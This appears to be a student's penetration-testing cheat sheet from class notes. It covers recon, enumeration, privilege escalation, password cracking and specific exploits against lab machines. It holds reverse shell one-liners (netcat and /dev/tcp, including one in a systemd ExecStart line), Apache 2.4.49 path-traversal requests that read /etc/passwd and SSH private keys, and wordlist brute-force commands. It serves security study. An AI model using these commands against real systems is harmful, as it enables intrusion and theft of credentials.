# PTD-Cheatsheet
PTD Unit Cheat Sheet based on class notes

## Recon

### Find name and IP
```sudo  nbtscan 192.168.x.x/24```
### Scan all ports that are open and services running
``` nmap -p- --open -sV -A 192.168.x.x ```
### WPscan
```
wpscan --url URL --plugins-detection aggressive -e vp
wpscan --url URL --plugins-detection aggressive -e ap

# Brute Force login, will take very long time. Not recommended unless you have short listed wordlist and usernames
wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```



## Enumerating

### Enum4Linux
``` enum4linux 192.168.x.x ```

### Log Files
```
#Look for cron jobs being recorded in log files.  A cron job may run a certain named file every 5 secondso or so.
#Log file may be output of pspy instance -> Use to find vulnerable folder or file

e.g 2019/09/10 15:25:02 ^[[31;1mCMD: UID=0    PID=796    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control ^[[0m
2019/09/10 15:25:02 ^[[31;1mCMD: UID=1000 PID=803    | /bin/sh -c /home/dawn/ITDEPT/product-control ^[[0m
2019/09/10 15:26:01 ^[[31;1mCMD: UID=0    PID=809    | /usr/sbin/CRON -f ^[[0m

In this example product control is a cron job, and is given permissions to run.
Lists the processes that are being launched in real time, including processes owned by root.
```




## Escalate Privileges

### Backup File
```Navigate to user directory and use ls -lah in backup files to find readable items
# Look for;
- processes run as root
- hashed passwords
- any processes that give you root access after running
```
### Find execute privileges for user currently logged in
``` sudo -l ```
### MySQL 
```
# Spawn a shell from \!sh mySql - sudo mysql -u root -p
# Check mysql history for login details - cat .mysql_history'

 ```










## Payloads

#Payload Links
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config

### Low Privilege Reverse Shell
```
#!/bin/bash
nc -e /bin/sh 192.168.x.x 4444
```
### ExecStart exploit
``` ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.124/4444 0>&1'
# To file: echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.124/4444 0>&1'" >> /tmp/wrapper.sh
```
### PHP Reverse Shell
https://github.com/pentestmonkey/php-reverse-shell


## Password Cracking
https://www.tunnelsup.com/hash-analyzer/

### hashcat
```
#If md5 hash is found
hashcat -m 0 -a 0 md5.txt /usr/share/wordlists/rockyou.txt 
```
### John the ripper
```
john hash --wordlist=/user/share/wordlists/rockyou.txt --format=md5crypt
```

## Helpful tools

### Services
```
#Search Service contents
systemctl cat service.name.sh```
# List all services
systemctl list-unit-files –type=service
# Restart Service
sudo systemctl restart service_name.service
```
### Create password for passwd file
``` openssl passwd 123 ```
### Overwrite user service with payload
``` cp /tmp/exploit.sh /usr/local/bin/service.sh ```
### Decode hash base64
``` echo ' HASH '  | base64 -d ```


## General Commands

### SSH User Login
```ssh -i ssh_key.txt user@192.168.x.x```
### File permissions to run
```chmod 777 OR chmod 600```


## Exploits- Specific Scenarios

### Web Applications
- Remember to check service version and use https://www.exploit-db.com/ to find vulnerabilities
-  Version is usually found using the -sV flag on nmap or IF it has a webpage hosting a CMS, check the webpage for the version running.

### Reveal contents of a file Apache HTTP Server 2.4.49 Exploit- Path Traversal and Remote Code Execution
```
# Reveal passwd file
curl -s --path-as-is -d "echo Content-Type: text/plain;" "192.168.56.125/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
# Reveal private SSH keys for any users found
curl -s --path-as-is -d "echo Content-Type: text/plain;" "192.168.56.125/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/treehouse/.ssh/id_rsa"
```
### File Capabilities
```
File capabilities are certain permissions you can give to binaries.
Instead of giving a binary ‘sudo’ permission, you can give the binary certain elevated permissions. This is considered
a safer practise than giving the binary full permissions, as sometimes a binary only needs elevated permissions for a few selected functions.
https://manpages.ubuntu.com/manpages/lunar/en/man7/capabilities.7.html

# List all file capabilities
getcap -r / 2>/dev/null

# RSYNC
rsync is a utility for efficiently transferring and synchronizing files between a computer and a storage drive and across networked computers.
# Copy files using rsync
rsync /etc/passwd /home/destination/
rsync passwd /etc/passwd
```

### CMS Made Simple 2.2.5 Authenticated Remote Code Execution
```
#Enumerate the directories
dirb http://192.168.56.126/   -> make sure to include the directed page e.g /cmsms/ as URL
Visit and follow
https://www.exploit-db.com/exploits/44976
- NOTE! When uploading file to CMS copy to .php file type in the upload folder
```

### IIS FTP file upload exploit
```
https://infinitelogins.com/2020/01/20/hack-the-box-write-up-devel-without-metasploit/
```




